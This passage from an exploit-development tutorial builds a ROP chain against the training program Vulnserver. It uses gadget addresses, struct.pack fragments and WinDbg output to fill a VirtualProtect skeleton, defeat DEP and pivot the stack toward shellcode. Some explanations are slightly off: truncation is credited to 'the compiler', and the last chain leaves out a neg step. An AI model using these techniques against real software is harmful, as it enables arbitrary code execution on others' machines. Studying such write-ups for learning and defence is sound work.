Now, `0xfffffefc` is sufficiently large to cover all four bytes.

A peculiar aspect of the `x86` architecture is its handling of addition operations that yield an eight-byte result, referred to as a `QWORD`. Despite the `x86` not traditionally supporting `QWORD` arithmetic (exceptions exist in the realm of floating-point operations), if two four-byte values are added to produce a `QWORD`, the compiler simply truncates the most significant four bytes, preserving only the least significant half.

To illustrate this behavior, we can perform an addition between `0x104` and its two's complement, which is `0xfffffefc`. When combined, the compiler will effectively regard the sum as `0x00`:

```text
0:004> ? 0x104 + fffffefc
Evaluate expression: 4294967296 = 00000001`00000000
```

The result, `0x0000000100000000`, represents a value that has exceeded the 4-byte boundary of a `DWORD`. But in the context of a `DWORD` operation in `x86`, only the least significant 4 bytes would be retained, which is `0x00`. This showcases the interesting behavior of the `x86` architecture when faced with arithmetic overflow.

Leveraging the nuances of `x86` arithmetic overflow offers unique ways to "increment" a value. Here are some common approaches:

#### The Power of the `neg` Instruction

The `neg` operation calculates the two's complement of a value, essentially subtracting it from `0`.

Executing the `neg` instruction on `0xfffffefc` yields `0x104`:

```text
0:004> ? 0 - 0xfffffefc
Evaluate expression: -4294967036 = ffffffff`00000104
```

After this, an `add r32, r32` gadget can be employed to augment the value of the destination operand by `0x104`.

#### Emulating the `neg` Behavior

In scenarios where a handy `neg` instruction-containing gadget is missing, it's still possible to simulate its operation using other instructions:

```text
ECX = 0xfffffefc
EAX = 0x00

sub eax, ecx
// EAX is now 0x104
```

To null out `EAX`, several alternatives exist:

```text
xor eax, eax
sub eax, eax
```

#### Intricacies of the `sub` Instruction

Using a `sub` instruction to increment might sound counterintuitive, but thanks to arithmetic overflow, it’s possible.

```text
0:004> r @esp
esp=0115fa08

0:004> r @eax
eax=fffffefc

> sub esp, eax

0:004> r @esp
esp=0115fb0c

// By calculating the difference from the original value, we see an increment of 0x104 bytes.
0:004> ? esp - 0115fa08 
Evaluate expression: 260 = 00000104
```

Returning back to `Vulnserver`, we were fortunate enough to uncover several gadgets that could help us increment the preserved stack address. This increment by the placeholder value `0x104` would guide us to the probable location of our shellcode:

```text
0x625014d5: pop eax ; ret 
0x625016ca: neg eax ; ret
0x62501e3a: mov esi, eax ; call edi 
0x6250221c: add esi, ebx ; ret 
0x62502412: mov eax, esi ; pop esi ; pop edi ; ret 
```

It's noteworthy that the third gadget ends with a `call` instruction. However, as we've illustrated earlier, this isn't an impediment. We can artfully use the address of a gadget implementing a `pop r32; ret` instruction, which essentially mimics a return.

Combining all the elements, here's a representation of how our gadget chain will look. The aim is to increment the value in `EBX` (which stores the address pointing to the `VirtualProtect` skeleton) by `0x104` bytes. The resulting address will point to the tentative shellcode location. Remember, this is an approximation. If the shellcode's actual location differs, only a singular value will need to be adjusted.

```python
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret  
rop += struct.pack('<L', 0xfffffefc) # 0 - 0x104
rop += struct.pack('<L', 0x625016ca) # neg eax ; ret // eax is now 0x104
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501e3a) # mov esi, eax ; call edi
rop += struct.pack('<L', 0x6250221c) # add esi, ebx ; ret  // esi is now ebx + 0x104
rop += struct.pack('<L', 0x62502412) # mov eax, esi ; pop esi ; pop edi ; ret
rop += struct.pack('<L', 0x41414141) # junk for esi
rop += struct.pack('<L', 0x41414141) # junk for edi 
```

At the end of the sequence of gadgets above, the `ESI` register is moved back into `EAX` during the `mov eax, esi ; pop esi ; pop edi ; ret instruction`. This step is essential due to the previously highlighted gadget that can move a value into a pointer:

```text
mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
```

With `EAX` now storing the prospective address of the shellcode location, the next objective is to transfer this address into the `VirtualProtect` skeleton as the second placeholder. To achieve this, the pointer in `EBX`, which points to the `VirtualProtect` skeleton, must be incremented by `0x04` bytes.

While a common gadget like the one below is often available, it's not the case this time:

```text
inc r32 ; ret

// where r32 would be EBX
```

The earlier chain has shown how to increment a value, but using that method to increase `EBX` by just `0x04` bytes is cumbersome, especially when needing to do it for multiple placeholders.

Fortunately, two more fitting gadgets were uncovered:

```text
0x62501eaf: mov  [ebx+0x04], eax ; call  [0x625070DC]
0x62501ecd: mov  [ebx+0x08], eax ; call  [0x62507104]
```

The first gadget can overwrite the second placeholder with `EAX`, while the second gadget can overwrite the third. Recalling the `VirtualProtect` skeleton from earlier discussions, both the second and third placeholders need the same value, the shellcode's location. Thus, with these two gadgets, two placeholders can be filled in one go.

The `call [0x625070DC]` is the same instruction at the end of the gadget that originally overwrote the first placeholder with the address of the `VirtualProtect` stub which was held by `EAX`. Since this address (`0x625070DC`) already points to a gadget mimicking a return, no further action is needed.

Yet, the second gadget introduces yet another call to a hardcoded pointer (`0x62507104`). This can be handled similarly by reassigning the address this pointer points to, to mimic a return.

This simply just requires appending the following gadgets to the 'prologue' near the beginning of the chain:

```python
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625012f7) # pop r32; ret
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x62507104) # ebx will be 0x62507104
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]  
```

Putting everything together, the sequence of gadges which will overwrite the second and third placeholders in the `VirtualProtect` skeleton will appear as such:

```python
rop += struct.pack('<L', 0x62501eaf) # mov [ebx+0x04], eax ; call  [0x625070DC]
# ! second placeholder overwritten with ret address
rop += struct.pack('<L', 0x62501ecd) # mov  [ebx+0x08], eax ; call  [0x62507104]
# ! third placeholder overwritten with lpaddress (same as ret address)
```

### Overriding the rest of the placeholders

Usually, as you progress deep into a gadget chain, you'll begin to treat certain sequences of gadgets like functions, reusing them as needed. We'll be adopting this approach for the remaining placeholders, which are as follows:

- dwSize
- flNewProtect
- lpflOldProtect

Now that the first three placeholders are overwritten, we will need to increase `EBX` by `0x0C / 0n12` bytes in order to start at the fourth placeholder. Afterwards we will perform the same sequence of gadgets that was used to increase `EBX` by `0x104` to point to the prospective shellcode location:

```python
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret 
rop += struct.pack('<L', 0xfffffff4) # 0 - 0x0c
rop += struct.pack('<L', 0x625016ca) # neg eax ; ret
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret 
# EDI contains a pop/ret instruction in order to simulate a return when an indirect call to EDI is made in the next gadget below
rop += struct.pack('<L', 0x62501e3a) # mov esi, eax ; call edi
rop += struct.pack('<L', 0x6250221c) # add esi, ebx ; ret 
```

Upon executing the `add esi, ebx ; ret` instruction, `ESI` now points to the third placeholder in the skeleton, leaving `EBX` unmodified. This poses a problem since the only available gadget for inserting a `DWORD` into a pointer specifically mandates `EBX` as the destination operand. Yet, reflecting back on a previous section, a similar obstacle was encountered and successfully navigated using the following gadget sequence:

```python
rop += struct.pack('<L', 0x62501a9d) # mov  [esp+0x00], eax ; call  [0x62507124]
rop += struct.pack('<L', 0x41414141) # junk will be overwritten by [esp + 0x00]
```

Here, the memory address `0x62507124` is pointing to an address of a gadget that essentially mimics the `mov ebp, eax ; ret` instruction. Prior to utilizing this gadget, it's necessary to move `ESI` into `EAX`. Conveniently, a gadget is on hand to accomplish this:

```text
0x62502412: mov eax, esi ; pop esi ; pop edi ; ret
```

With `EBX` now directing to the third placeholder within the skeleton, the remaining task involves replacing the placeholders in the skeleton with their appropriate values. Given that all the necessary gadgets to accomplish this have been previously outlined, the details will be skipped here for the sake of conciseness.

### Stack Pivot

Finally, with the skeleton completely constructed, the next step is to shift the stack to target the beginning of the skeleton, thereby initiating the `VirtualProtect` call. However before doing so, this is the moment to set a breakpoint at the end of the gadget chain and verify that both the second and third placeholders point to the shellcode. If they don't align, simply adjust the offset.

To execute a stack pivot, several commonly used gadgets might come into play:

Note: In the context below, `r32` represents the register that targets the beginning of the `VirtualProtect` skeleton.

```text
push r32
pop esp
...
ret
```

```text
mov esp, r32
...
ret
```

```text
xchg r32, esp // xchg esp, r32
...
ret
```

```text
xor esp, esp / sub esp, esp
or esp, r32
...
ret
```

Luck doesn't always favor, and this is evident when sifting through the gadgets; however, several instances of the `leave ; ret` gadget are discovered.

Within the `x86` architecture, the `leave` instruction is commonly found used in the `__stdcall` calling convention. This convention is where the callee is responsible for stack cleanup, an operation often referred to as the function epilogue.

To clarify, the leave instruction emulates the following instructions:

```text
mov esp, ebp
pop ebp
```

For effective use of the `leave` instruction, it's essential to transfer the pointer, which points to the start of the `VirtualProtect` skeleton, to `EBP`. Notably, the register `EBX` currently holds this pointer. The challenge arises from the absence of direct gadgets that could transfer from `EBX` to `EBP`. Nevertheless, during the search, an instrumental gadget emerges:

```text
0x625017c0: mov ebp, eax ; call  [0x625070E8] 
```

Breaking down how this gadget will be used:

The initial step is transferring `EBX` to `EAX`, though no direct gadget facilitates this action. A slight workaround is considered since it's known that `EBX` can be moved into to `ESI` via the `add esi, ebx` gadget, and `ESI` can then be moved into `EAX`.

The involves leveraging the `mov ebp, eax ; call [0x625070E8]` gadget to trigger the `leave ; ret` instruction. This is achieved by redirecting the `0x625070E8` pointer to insead point to a gadget which is the `leave ; ret` command.

This requires  an additional pointer overwrite addition at the start of the gadget chain, as shown below:

```python
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x62501573) # leave ; ret (will be important for stack pivot at end)
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x625070E8) # ebx will be 0x625070E8
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
```

Ultimately, the goal is to move the pointer to the `VirtualProtect` skeleton from `EBX` into `EAX`. Notably, `EBX` is currently pointing to the fourth `DWORD` within the `VirtualProtect` skeleton, therefore requiring an adjustment.

Before making any modifications, it's crucial to consider the following specific scenario. As outlined earlier, when `EBP` gets moved into `ESP`, the `leave` instruction will then pop a `DWORD` off the stack into `EBP`. If the topmost value on the stack at that time happens to be the `VirtualProtect` address, it will be moved into `EBP`, thereby completely destroying the entire gadget chain.

Provided below is a demonstration of what would happen, please keep in mind that the `leave` instruction was substituted for the more explicit `mov esp, ebp ; pop ebp` instructions:

```text
62501573  mov esp, ebp

> dds ebp L6
00f4f228  766d5c80  // VirtualProtect Address
00f4f22c  00f4f2e8  // ret address
00f4f230  00f4f2e8  // lpAddress
00f4f234  00000001  // dwSize  
00f4f238  00000040  // flNewProtect
00f4f23c  625070e4  // lpflOldProtect

// step through mov esp, ebp instruction

62501575  pop ebp

> dds esp L1
00f4f228  766d5c80  // VirtualProtect Address

// step through pop ebp instruction

0:003> dds esp L1
00f4f22c  00f4f2e8

// observe that ESP does not point to the VirtualProtect address anymore
```

The remedy to this situation is to adjust `EBX` so that it doesn't point directly to the beginning of the skeleton. Instead, it should target one `DWORD` prior to the skeleton's start. This way, that particular `DWORD` serves as the sacrificial entry that gets popped into `EBP`. Here is another demonstration of how this would now work instead:

```text
62501573  mov esp, ebp

> dds ebp L7
00f4f224  00000000
00f4f228  766d5c80  // VirtualProtect Address
00f4f22c  00f4f2e8  // ret address
00f4f230  00f4f2e8  // lpAddress
00f4f234  00000001  // dwSize  
00f4f238  00000040  // flNewProtect
00f4f23c  625070e4  // lpflOldProtect

// step through mov esp, ebp instruction

62501575  pop ebp

> dds esp L1
00f4f224  00000000

// step through pop ebp instruction

0:003> dds esp L1
00f4f228  766d5c80

// observe that ESP does point to the VirtualProtect address
```

Lastly the following sequence of gadgets that will adjust `EBX` to point to the start of the `VirtualProtect` skeleton - `0x04`, move the pointer into `EAX` and execute the stack pivot:

```python
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret 
rop += struct.pack('<L', 0xfffffff0) # 0 - 0x10
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501e3a) # mov esi, eax ; call edi
rop += struct.pack('<L', 0x6250221c) # add esi, ebx ; ret
rop += struct.pack('<L', 0x62502412) # mov eax, esi ; pop esi ; pop edi ; ret
rop += struct.pack('<L', 0x41414141) # junk for esi
rop += struct.pack('<L', 0x41414141) # junk for edi 
# ! EAX now points to start of skeleton
rop += struct.pack('<L', 0x625017c0) # mov ebp, eax ; call  [0x625070E8]
```

## Conclusion

Writeups on complex topics like this can be challenging to grasp without trying them out firsthand.

The final `ROP` chain can be found in the following gist:
[https://gist.github.com/m-q-t/4eb78075e708dc0ec51f93a96964ee9b](https://gist.github.com/m-q-t/4eb78075e708dc0ec51f93a96964ee9b)

Thanks for reading.
